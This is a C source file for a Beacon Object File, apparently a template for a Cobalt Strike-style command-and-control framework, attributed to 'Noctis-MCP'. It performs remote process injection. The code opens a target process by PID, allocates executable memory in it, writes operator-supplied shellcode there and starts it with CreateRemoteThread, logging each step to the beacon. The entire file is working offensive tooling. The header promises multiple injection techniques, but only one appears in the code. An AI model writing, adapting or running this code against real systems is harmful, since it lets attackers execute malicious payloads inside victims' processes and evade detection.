/*
 * Process Injection BOF Template
 * ===============================
 *
 * BOF for remote process injection
 * Supports multiple injection techniques
 *
 * Author: Noctis-MCP
 */

#include <windows.h>

// ============================================================================
// BOF API
// ============================================================================

DECLSPEC_IMPORT void BeaconPrintf(int type, char* fmt, ...);
DECLSPEC_IMPORT void* BeaconDataParse(char* buffer, int size);
DECLSPEC_IMPORT int BeaconDataInt(void* parser);
DECLSPEC_IMPORT char* BeaconDataExtract(void* parser, int* size);

// ============================================================================
// INJECTION FUNCTIONS
// ============================================================================

/**
 * Classic CreateRemoteThread injection
 */
BOOL InjectViaCreateRemoteThread(DWORD pid, PVOID shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = NULL;
    LPVOID remoteBuffer = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;

    BeaconPrintf(0, "[*] Opening process PID: %d", pid);

    // Open target process
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (!hProcess) {
        BeaconPrintf(1, "[!] OpenProcess failed: %d", GetLastError());
        goto cleanup;
    }

    BeaconPrintf(0, "[+] Process opened successfully");

    // Allocate memory in target
    remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!remoteBuffer) {
        BeaconPrintf(1, "[!] VirtualAllocEx failed: %d", GetLastError());
        goto cleanup;
    }

    BeaconPrintf(0, "[+] Memory allocated at: 0x%p", remoteBuffer);

    // Write shellcode
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, &bytesWritten)) {
        BeaconPrintf(1, "[!] WriteProcessMemory failed: %d", GetLastError());
        goto cleanup;
    }

    BeaconPrintf(0, "[+] Shellcode written (%zu bytes)", bytesWritten);

    // Create remote thread
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteBuffer,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        BeaconPrintf(1, "[!] CreateRemoteThread failed: %d", GetLastError());
        goto cleanup;
    }

    BeaconPrintf(0, "[+] Remote thread created successfully");
    success = TRUE;

cleanup:
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);

    return success;
}

// ============================================================================
// BOF ENTRY POINT
// ============================================================================

void go(char* args, int length) {
    BeaconPrintf(0, "[*] Process Injection BOF");

    // Parse arguments
    void* parser = BeaconDataParse(args, length);

    // Argument 1: Target PID
    DWORD pid = (DWORD)BeaconDataInt(parser);

    // Argument 2: Shellcode
    int shellcodeSize = 0;
    char* shellcode = BeaconDataExtract(parser, &shellcodeSize);

    if (pid == 0) {
        BeaconPrintf(1, "[!] Invalid PID");
        return;
    }

    if (!shellcode || shellcodeSize == 0) {
        BeaconPrintf(1, "[!] No shellcode provided");
        return;
    }

    BeaconPrintf(0, "[*] Target PID: %d", pid);
    BeaconPrintf(0, "[*] Shellcode size: %d bytes", shellcodeSize);

    // Perform injection
    if (InjectViaCreateRemoteThread(pid, shellcode, shellcodeSize)) {
        BeaconPrintf(0, "[+] Injection successful!");
    } else {
        BeaconPrintf(1, "[!] Injection failed");
    }
}
